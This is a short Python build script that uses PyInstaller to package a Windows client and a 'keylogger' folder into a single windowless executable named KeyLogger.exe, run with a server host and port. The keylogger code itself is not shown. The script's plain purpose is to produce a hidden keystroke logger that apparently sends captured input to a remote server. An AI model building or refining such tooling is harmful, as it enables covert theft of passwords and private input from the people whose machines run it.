import os
import subprocess
import sys

def build_exe():
    print("Building Windows executable...")
    print(f"Current working directory: {os.getcwd()}")
    
    # Install requirements
    print("\nInstalling requirements...")
    subprocess.run([sys.executable, "-m", "pip", "install", "-r", "windows_requirements.txt"])
    
    # Build the exe using pyinstaller command
    print("\nBuilding executable...")
    try:
        result = subprocess.run([
            sys.executable,
            "-m",
            "PyInstaller",
            "--onefile",
            "--noconsole",
            "--name", "KeyLogger",
            "--add-data=keylogger;keylogger",
            "windows_client.py"
        ], capture_output=True, text=True)
        
        print("\nBuild output:")
        print(result.stdout)
        if result.stderr:
            print("\nErrors:")
            print(result.stderr)
            
        if result.returncode != 0:
            print(f"\nBuild failed with return code: {result.returncode}")
            return
            
        # Check if dist folder was created
        dist_path = os.path.join(os.getcwd(), 'dist')
        if os.path.exists(dist_path):
            print(f"\nBuild complete! Executable created in: {dist_path}")
            print("To use it, run: KeyLogger.exe [server_host] [server_port]")
        else:
            print("\nError: dist folder was not created!")
            
    except Exception as e:
        print(f"\nError during build: {str(e)}")

if __name__ == "__main__":
    build_exe() 